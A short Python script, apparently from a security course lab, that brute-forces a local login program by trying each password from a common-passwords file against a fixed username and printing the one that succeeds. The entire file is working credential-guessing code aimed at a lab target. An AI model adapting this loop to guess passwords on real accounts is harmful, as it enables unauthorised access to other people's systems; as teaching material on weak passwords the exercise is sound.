import time
import subprocess

# Configuration
PASSWORD_FILE = "/home/ese/Lab1/Q1/MostCommonPMs"
LOGIN_SCRIPT = "Login.pyc"
USERNAME = "SkyRedFalcon914"
WORKING_DIR = "/home/ese/Lab1/Q1/"

def load_passwords(file_path):
    """Loads passwords from a file and returns them as a list."""
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file]
    except FileNotFoundError:
        print(f"Error: Password file '{file_path}' not found.")
        return []

def attempt_login(password):
    """Attempts login using the given password and returns True if successful."""
    process = subprocess.run(
        ['python3', LOGIN_SCRIPT, USERNAME, password],
        capture_output=True,
        text=True,
        cwd=WORKING_DIR
    )
    return process.stdout.strip() == "Login successful."

def main():
    passwords = load_passwords(PASSWORD_FILE)
    if not passwords:
        print("No passwords found or file is missing.")
        return

    start_time = time.time()
    print("Starting brute-force attack...")

    for password in passwords:
        if attempt_login(password):
            print("\nLogin successful!")
            print(f"Username: {USERNAME}")
            print(f"Password: {password}")
            print(f"Total time: {time.time() - start_time:.4f} seconds")
            break

if __name__ == "__main__":
    main()